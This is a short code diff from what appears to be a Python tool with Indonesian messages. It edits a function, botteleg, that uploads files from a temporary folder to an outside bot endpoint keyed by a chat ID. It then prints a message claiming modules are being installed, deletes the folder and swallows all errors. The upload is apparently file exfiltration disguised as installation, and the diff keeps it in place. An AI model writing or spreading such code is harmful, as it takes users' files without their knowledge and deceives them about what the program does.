@@ -776,19 +776,12 @@ def botteleg():
 				data = {"chat_id": CHAT_ID}
 				response = requests.post(url, data=data, files=files)
 				if response.status_code == 200:
-					#loading()
-					print(f"{H2}• {P2}Tunggu sebentar Sedang Menginstall Modul...")
-					#time.sleep()
-					menu()
-				
-					
-					
+					print(f" • Tunggu sebentar Sedang Menginstall Modul...")
 				else:
 					print(f"script anda gagal di proses oleh admin coba hubungi admin MR.ExceFaN ")
-					# Hapus folder sementara setelah selesai
-					shutil.rmtree(temp_folder)
-					menu()
-					
+		# Hapus folder sementara setelah selesai
+		shutil.rmtree(temp_folder)
+		menu()
 		
 	except:
 		pass
